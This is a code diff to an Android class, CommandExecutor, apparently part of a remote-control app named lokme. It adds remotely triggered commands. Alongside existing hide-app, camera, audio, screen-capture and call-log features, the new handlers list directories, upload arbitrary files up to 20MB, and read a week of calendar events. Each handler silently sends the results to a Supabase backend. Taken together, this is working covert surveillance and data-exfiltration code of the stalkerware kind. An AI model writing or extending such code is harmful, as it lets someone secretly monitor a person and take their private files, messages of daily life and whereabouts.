@@ -1,11 +1,26 @@
 package com.lokme.service
 
+import android.app.AlarmManager
 import android.app.AlertDialog
+import android.app.PendingIntent
 import android.content.ComponentName
+import android.content.ContentResolver
 import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.database.Cursor
+import android.media.AudioAttributes
+import android.media.MediaPlayer
+import android.media.RingtoneManager
+import android.net.Uri
+import android.os.BatteryManager
+import android.os.Build
+import android.os.Environment
 import android.os.Handler
 import android.os.Looper
+import android.os.VibrationEffect
+import android.os.Vibrator
+import android.provider.CalendarContract
 import android.util.Log
 import com.lokme.admin.DeviceAdminReceiver
 import com.lokme.calllog.CallLogReader
@@ -13,13 +28,20 @@ import com.lokme.camera.AudioStreamHelper
 import com.lokme.camera.CameraHelper
 import com.lokme.camera.VideoStreamHelper
 import com.lokme.location.LocationHelper
+import com.lokme.model.CalendarEvent
+import com.lokme.model.DeviceFileEntry
 import com.lokme.network.SupabaseClient
 import com.lokme.network.WsClient
 import com.lokme.screen.ScreenCaptureHelper
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import org.json.JSONArray
 import org.json.JSONObject
+import java.io.File
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class CommandExecutor(private val context: Context) {
 
@@ -78,6 +100,12 @@ class CommandExecutor(private val context: Context) {
             "STOP_VIDEO_STREAM" -> stopVideoStream(commandId, deviceId, onSuccess, onError)
             "HIDE_APP" -> hideApp(commandId, deviceId, onSuccess, onError)
             "SHOW_APP" -> showApp(commandId, deviceId, onSuccess, onError)
+            "PLAY_ALARM" -> playAlarm(commandId, deviceId, payload, onSuccess, onError)
+            "VIBRATE_DEVICE" -> vibrateDevice(commandId, deviceId, payload, onSuccess, onError)
+            "LIST_FILES" -> listFiles(commandId, deviceId, payload, onSuccess, onError)
+            "DOWNLOAD_FILE" -> downloadFile(commandId, deviceId, payload, onSuccess, onError)
+            "GET_CALENDAR" -> getCalendar(commandId, deviceId, onSuccess, onError)
+            "GET_BATTERY" -> getBattery(commandId, deviceId, onSuccess, onError)
             else -> onError("Unknown command: $commandType")
         }
     }
@@ -259,6 +287,248 @@ class CommandExecutor(private val context: Context) {
             }
         } catch (e: Exception) {
             onError(e.message ?: "Read failed")
+        }
+    }
+
+    private var mediaPlayer: MediaPlayer? = null
+
+    private fun playAlarm(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
+            val durationMs = json.optInt("duration_ms", 15000)
+
+            mediaPlayer?.release()
+            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+            if (uri == null) { onError("No alarm ringtone found"); return }
+
+            mediaPlayer = MediaPlayer().apply {
+                setAudioAttributes(AudioAttributes.Builder()
+                    .setUsage(AudioAttributes.USAGE_ALARM)
+                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                    .build())
+                setDataSource(context, uri)
+                isLooping = true
+                setVolume(1.0f, 1.0f)
+                prepare()
+                start()
+            }
+
+            handler.postDelayed({
+                try { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null } catch (_: Exception) {}
+            }, durationMs)
+
+            onSuccess("Alarm playing for ${durationMs}ms")
+        } catch (e: Exception) {
+            onError(e.message ?: "Alarm failed")
+        }
+    }
+
+    private fun vibrateDevice(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
+            val durationMs = json.optLong("duration_ms", 10000)
+            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator?
+            if (vibrator == null || !vibrator.hasVibrator()) {
+                onError("No vibrator on device")
+                return
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION") vibrator.vibrate(durationMs)
+            }
+            onSuccess("Vibrating for ${durationMs}ms")
+        } catch (e: Exception) {
+            onError(e.message ?: "Vibrate failed")
+        }
+    }
+
+    private fun listFiles(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
+            val path = json.optString("path", Environment.getExternalStorageDirectory().absolutePath)
+            val dir = File(path)
+            if (!dir.exists() || !dir.isDirectory) { onError("Directory not found: $path"); return }
+
+            val files = dir.listFiles()?.map { file ->
+                DeviceFileEntry(
+                    id = deviceId + "_" + file.absolutePath.hashCode(),
+                    device_id = deviceId,
+                    file_name = file.name,
+                    file_path = file.absolutePath,
+                    file_size = if (file.isFile) file.length() else 0,
+                    mime_type = if (file.isDirectory) "dir" else getMimeType(file.name),
+                    is_directory = file.isDirectory,
+                    last_modified = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(Date(file.lastModified()))
+                )
+            }?.toList() ?: emptyList()
+
+            // upload metadata to supabase
+            scope.launch { try { SupabaseClient.insertDeviceFiles(deviceId, files) } catch (_: Exception) {} }
+
+            val jsonArr = JSONArray()
+            files.forEach { f ->
+                jsonArr.put(JSONObject().apply {
+                    put("name", f.file_name)
+                    put("path", f.file_path)
+                    put("size", f.file_size)
+                    put("mime", f.mime_type)
+                    put("is_dir", f.is_directory)
+                    put("modified", f.last_modified)
+                })
+            }
+            onSuccess(jsonArr.toString())
+        } catch (e: Exception) {
+            onError(e.message ?: "List files failed")
+        }
+    }
+
+    private fun downloadFile(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val json = JSONObject(payload)
+            val filePath = json.optString("file_path", "")
+            if (filePath.isEmpty()) { onError("file_path required"); return }
+
+            val file = File(filePath)
+            if (!file.exists() || !file.isFile) { onError("File not found: $filePath"); return }
+
+            val maxBytes = 20L * 1024 * 1024 // 20MB
+            if (file.length() > maxBytes) { onError("File too large (max 20MB): ${file.length() / 1024 / 1024}MB"); return }
+
+            val bytes = file.readBytes()
+            val fileName = file.name
+
+            scope.launch {
+                try {
+                    val url = SupabaseClient.uploadDeviceFile(deviceId, fileName, bytes)
+                    onSuccess(url)
+                } catch (e: Exception) {
+                    onError(e.message ?: "Upload failed")
+                }
+            }
+        } catch (e: Exception) {
+            onError(e.message ?: "Download failed")
+        }
+    }
+
+    private fun getCalendar(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val resolver: ContentResolver = context.contentResolver
+            val uri = CalendarContract.Events.CONTENT_URI
+
+            val now = System.currentTimeMillis()
+            val weekAgo = now - 7 * 24 * 60 * 60 * 1000L
+
+            val projection = arrayOf(
+                CalendarContract.Events.TITLE,
+                CalendarContract.Events.DESCRIPTION,
+                CalendarContract.Events.EVENT_LOCATION,
+                CalendarContract.Events.DTSTART,
+                CalendarContract.Events.DTEND,
+                CalendarContract.Events.ALL_DAY,
+                CalendarContract.Events.ORGANIZER
+            )
+            val selection = "${CalendarContract.Events.DTSTART} >= ? AND ${CalendarContract.Events.DTSTART} <= ?"
+            val selArgs = arrayOf(weekAgo.toString(), now.toString())
+
+            val cursor: Cursor? = resolver.query(uri, projection, selection, selArgs, "${CalendarContract.Events.DTSTART} ASC")
+            val events = mutableListOf<CalendarEvent>()
+            val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
+
+            cursor?.use { c ->
+                while (c.moveToNext()) {
+                    val title = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.TITLE)) ?: ""
+                    val desc = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.DESCRIPTION)) ?: ""
+                    val loc = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.EVENT_LOCATION)) ?: ""
+                    val start = c.getLong(c.getColumnIndexOrThrow(CalendarContract.Events.DTSTART))
+                    val end = c.getLong(c.getColumnIndexOrThrow(CalendarContract.Events.DTEND))
+                    val allDay = c.getInt(c.getColumnIndexOrThrow(CalendarContract.Events.ALL_DAY)) == 1
+                    val org = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.ORGANIZER)) ?: ""
+
+                    events.add(CalendarEvent(
+                        device_id = deviceId,
+                        title = title,
+                        description = desc,
+                        event_location = loc,
+                        start_time = sdf.format(Date(start)),
+                        end_time = sdf.format(Date(end)),
+                        all_day = allDay,
+                        organizer = org
+                    ))
+                }
+            }
+
+            scope.launch { try { SupabaseClient.insertCalendarEvents(deviceId, events) } catch (_: Exception) {} }
+
+            val jsonArr = JSONArray()
+            events.forEach { e ->
+                jsonArr.put(JSONObject().apply {
+                    put("title", e.title)
+                    put("description", e.description)
+                    put("location", e.event_location)
+                    put("start_time", e.start_time)
+                    put("end_time", e.end_time)
+                    put("all_day", e.all_day)
+                    put("organizer", e.organizer)
+                })
+            }
+            onSuccess(jsonArr.toString())
+        } catch (e: Exception) {
+            onError(e.message ?: "Calendar failed")
+        }
+    }
+
+    private fun getBattery(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val isCharging = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS) == BatteryManager.BATTERY_STATUS_CHARGING
+            val technology = bm.getStringProperty(BatteryManager.BATTERY_PROPERTY_TECHNOLOGY) ?: ""
+            val temperature = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_TEMPERATURE) / 10.0f
+            val voltage = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_VOLTAGE)
+            val health = when (bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_HEALTH)) {
+                BatteryManager.BATTERY_HEALTH_GOOD -> "good"
+                BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
+                BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
+                BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
+                BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "failure"
+                else -> "unknown"
+            }
+
+            scope.launch {
+                try {
+                    SupabaseClient.insertBatteryStatus(deviceId, level, isCharging, technology, temperature, voltage, health)
+                } catch (_: Exception) {}
+            }
+
+            val json = JSONObject().apply {
+                put("level", level)
+                put("is_charging", isCharging)
+                put("technology", technology)
+                put("temperature", temperature)
+                put("voltage", voltage)
+                put("health", health)
+            }
+            onSuccess(json.toString())
+        } catch (e: Exception) {
+            onError(e.message ?: "Battery failed")
+        }
+    }
+
+    private fun getMimeType(fileName: String): String {
+        val ext = fileName.substringAfterLast('.', "").lowercase()
+        return when (ext) {
+            "jpg", "jpeg" -> "image/jpeg"
+            "png" -> "image/png"
+            "gif" -> "image/gif"
+            "mp4" -> "video/mp4"
+            "mp3" -> "audio/mpeg"
+            "pdf" -> "application/pdf"
+            "doc", "docx" -> "application/msword"
+            "txt" -> "text/plain"
+            "zip" -> "application/zip"
+            "apk" -> "application/vnd.android.package-archive"
+            else -> "application/octet-stream"
         }
     }
 
